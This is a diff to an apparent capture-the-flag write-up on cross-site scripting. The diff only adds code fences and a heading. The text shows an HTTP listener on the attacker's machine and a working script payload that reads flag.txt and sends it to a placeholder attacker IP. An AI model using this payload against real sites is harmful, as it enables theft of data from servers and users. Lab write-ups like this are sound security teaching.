@@ -5,8 +5,10 @@ Exploitation Process
 1. Setting Up the Listener
 
 To capture the exfiltrated data, an HTTP server was set up on the attacker’s machine:
+```html
 
 python3 -m http.server 8000
+```
 
 This server listens for incoming requests, which will contain the sensitive data exfiltrated from the target.
 
@@ -19,6 +21,8 @@ The goal of the exploit was twofold:
 
 The crafted payload was as follows:
 
+## XSS Payloads
+```html
 '"><script>
   fetch('http://127.0.0.1:8080/flag.txt')
     .then(response => response.text())
@@ -26,6 +30,8 @@ The crafted payload was as follows:
       fetch('http://<YOUR-IP-ADDRESS>:8000/?flag=' + encodeURIComponent(data));
     });
 </script>
+```
+
 
 The payload first fetches the flag from the target server, encodes it to ensure safe transmission, and sends it to the attacker’s server via a GET request.
 
